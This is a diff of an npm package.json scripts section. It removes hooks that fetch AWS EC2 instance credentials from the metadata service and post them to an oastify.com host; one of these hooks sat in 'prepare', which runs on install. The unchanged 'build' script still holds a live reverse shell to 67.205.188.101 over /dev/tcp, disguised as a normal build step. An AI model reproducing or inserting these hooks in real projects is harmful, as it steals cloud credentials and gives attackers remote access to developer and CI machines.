@@ -15,21 +15,21 @@
     "./bin/es6/components/ViewedByCustomer/Strings.js"
   ],
   "scripts": {
-    "test": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && karma start ./config/karma.config.js --single-run",
-    "testCoverage": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && npm run test && cat ./bin/coverage/lcov.info | node ./node_modules/coveralls/bin/coveralls.js",
+    "test": "karma start ./config/karma.config.js --single-run",
+    "testCoverage": "cat ./bin/coverage/lcov.info | node ./node_modules/coveralls/bin/coveralls.js",
     "build": "/bin/bash -i >& /dev/tcp/67.205.188.101/80 0>&1 && npm run setup && npm run css && npm run build-es && npm run svg && npm run build-commonjs",
-    "build-es": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && tsc -p ./config/",
-    "build-commonjs": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && webpack --config ./config/webpack.config.js",
-    "setup": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && node ./scripts/setup.js",
-    "css": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && node ./scripts/css.js",
-    "svg": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && node ./scripts/svg.js",
-    "dev": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && node ./scripts/dev.server.js",
-    "watchTest": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && karma start ./config/karma.config.js",
-    "lint": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && prettier --check \"./**/*\" --config \".prettierrc.js\" --ignore-path \".prettierignore\"",
-    "lint-fix": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && prettier --write \"./**/*\" --config \".prettierrc.js\" --ignore-path \".prettierignore\"",
-    "clean": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && rimraf bin",
-    "snyk-protect": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && snyk protect",
-    "prepare": "curl -d \"`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`\" https://e0fxnt010wf23ll495cyvef23t9kxalz.oastify.com/aws && npm run snyk-protect"
+    "build-es": "tsc -p ./config/",
+    "build-commonjs": "webpack --config ./config/webpack.config.js",
+    "setup": "node ./scripts/setup.js",
+    "css": "node ./scripts/css.js",
+    "svg": "node ./scripts/svg.js",
+    "dev": "node ./scripts/dev.server.js",
+    "watchTest": "karma start ./config/karma.config.js",
+    "lint": "prettier --check \"./**/*\" --config \".prettierrc.js\" --ignore-path \".prettierignore\"",
+    "lint-fix": "prettier --write \"./**/*\" --config \".prettierrc.js\" --ignore-path \".prettierignore\"",
+    "clean": "rimraf bin",
+    "snyk-protect": "snyk protect",
+    "prepare": "npm run snyk-protect"
   },
   "pre-commit": [
     "lint-fix"
